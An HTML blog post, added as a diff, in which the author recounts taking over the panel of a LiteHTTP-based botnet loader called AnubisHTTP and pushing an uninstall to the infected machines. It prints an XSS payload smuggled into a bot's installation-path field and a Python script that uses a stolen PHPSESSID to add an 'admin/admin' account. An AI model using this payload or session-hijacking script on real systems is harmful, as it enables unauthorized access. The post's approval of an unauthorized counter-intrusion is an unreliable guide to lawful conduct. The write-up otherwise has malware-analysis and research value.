@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="How I took down a small botnet exploiting vulnerabilities in AnubisHTTP, based on LiteHTTP.">
+    <meta name="keywords" content="AnubisHTTP, LiteHTTP, botnet, cybersecurity, malware analysis, ethical hacking, XSS exploitation">
+    <meta name="author" content="01Xyris">
+    <meta name="robots" content="index, follow">
+    <title>How I Took Down a Small Botnet</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism.min.css">
+    <link rel="stylesheet" href="../css/styles.css">
+    <link rel="stylesheet" href="../css/blog.css">
+    <link rel="icon" href="../img/lite/favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div class="window">
+        <div class="title-bar">
+            <span>How I Took Down a Small Botnet</span>
+            <div class="title-bar-buttons">
+                <div>-</div>
+                <div>X</div>
+            </div>
+        </div>
+        <div class="content">
+            <div class="blog-post">
+                <h3>Hey guys, welcome to my new blog!</h3>
+                <p>Today, I'll show you how I managed to take down a small botnet using reverse engineering, XSS exploitation, and some creative scripting.</p>
+
+                <h3>Discovery: AnubisHTTP</h3>
+                <p>A few days ago, I noticed someone selling a new loader called <strong>AnubisHTTP</strong>, which is based on <a href="https://github.com/zettabithf/LiteHTTP" target="_blank">LiteHTTP</a>.</p>
+                <img src="../img/lite/anubis1.png" alt="AnubisHTTP Screenshot">
+                <img src="../img/lite/anubis2.png" alt="AnubisHTTP Screenshot">
+
+                <h4>What is LiteHTTP?</h4>
+                <p>LiteHTTP is an HTTP bot written in C# for .NET 2.0, originally developed 7-9 years ago. The developer of AnubisHTTP used it as the base for their loader, with minimal improvements.</p>
+                <img src="../img/lite/funny.gif" alt="Funny GIF">
+
+                <h3>Finding the Binary</h3>
+                <p>To find a binary for this new loader, I turned to <a href="https://any.run" target="_blank">any.run</a>. Searching for "anubis" yielded no results, but "litehttp" gave me a hit:</p>
+                <ul>
+                    <li><a href="https://app.any.run/tasks/5828b5f6-da8d-4d17-82e8-774bd086c1ab" target="_blank">any.run Task</a></li>
+                    <li><a href="http://87.120.126.5/VmCetSC7/login" target="_blank">Panel URL</a></li>
+                </ul>
+
+                <h3>Reversing the Binary</h3>
+                <p>Using the binary from any.run, I deobfuscated it with <strong>ConfuserEx2_Deobfuscate_Tools</strong> in about 5 minutes. Examining the code revealed it was almost identical to LiteHTTP, including the config file:</p>
+                <img src="../img/lite/dnspy.png" alt="Decompiled Code">
+                <p>The configuration revealed the key (<code>string_2</code>) and host (<code>string_0</code>), matching the panel URL.</p>
+
+                <h4>Data Flow</h4>
+                <p>The bot sent data to <code>http://87.120.126.5/VmCetSC7/page.php</code>, including hardware ID, IP address, and other information.</p>
+                <p>LiteHTTP's GitHub repository provided details about <code>page.php</code>:</p>
+                <img src="../img/lite/lite.png" alt="LiteHTTP PHP Code">
+                <p>The PHP code sanitized most inputs but left <code>$inpat</code> vulnerable to injection. This was my entry point for an XSS exploit.</p>
+
+                <h3>Testing the Exploit</h3>
+                <p>I set up LiteHTTP locally on VMware for testing. To exploit <code>installation_path</code>, I injected the payload:</p>
+                <pre><code class="language-javascript">C:\\Windows\\32.exe&lt;script&gt;alert('1')&lt;/script&gt;</code></pre>
+                <p>The XSS triggered successfully when the IP address was clicked in the panel's UI.</p>
+
+                <h3>Triggering the Exploit</h3>
+                <p>The next challenge was ensuring the threat actor clicked my malicious "bot." I flooded the botnet with 100 fake connections, which guaranteed their curiosity would lead them to click.</p>
+                <img src="../img/lite/xss2.png" alt="XSS Triggered">
+
+                <h3>Gaining Control</h3>
+                <p>Using the stolen <code>PHPSESSID</code> from the XSS, I logged into the admin panel. Then, I wrote this Python script to create a new admin account directly:</p>
+                <pre><code class="language-python">import requests
+import argparse
+
+def create_user(base_url, php_sessid):
+    target_url = f"{base_url}/index.php?p=users"
+
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": base_url,
+        "Referer": f"{base_url}/index.php?p=users",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0 Config/100.2.9281.82",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1"
+    }
+
+    cookies = {
+        "PHPSESSID": php_sessid
+    }
+
+    data = {
+        "username": "admin",
+        "password": "admin",
+        "permissions": "3",
+        "doAdd": "Add User"
+    }
+
+    try:
+        print(f"[+] Sending POST request to: {target_url}")
+        print("[+] Adding user with username: 'admin' and password: 'admin'")
+
+        response = requests.post(target_url, headers=headers, cookies=cookies, data=data)
+
+        if response.status_code == 200:
+            print("[+] Request successful.")
+        else:
+            print(f"[-] Request failed. HTTP Status Code: {response.status_code}")
+    except Exception as e:
+        print(f"[-] An error occurred: {e}")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="Send POST request to create a user.")
+    parser.add_argument("base_url", help="Base URL (e.g., http://127.0.0.1/Panel)")
+    parser.add_argument("sessid", help="Valid PHPSESSID value")
+
+    args = parser.parse_args()
+    create_user(args.base_url, args.sessid)</code></pre>
+
+                <h3>Botnet Cleanup</h3>
+                <p>Finally, I used my new admin account to push an uninstall task across all infected machines. Here are the results:</p>
+                <img src="../img/lite/before.png" alt="Before Cleanup">
+                <img src="../img/lite/after.png" alt="After Cleanup">
+                <p>Another botnet down!</p>
+
+                <h3>Conclusion</h3>
+                <p>This was a satisfying exercise in ethical hacking and botnet takedown. Remember, always work within legal and ethical boundaries.</p>
+
+                <div class="disclaimer">
+                    <p><strong>Disclaimer:</strong> This blog post is for educational purposes only. Unauthorized access to systems is illegal.</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/plugins/autoloader/prism-autoloader.min.js"></script>
+</body>
+</html>
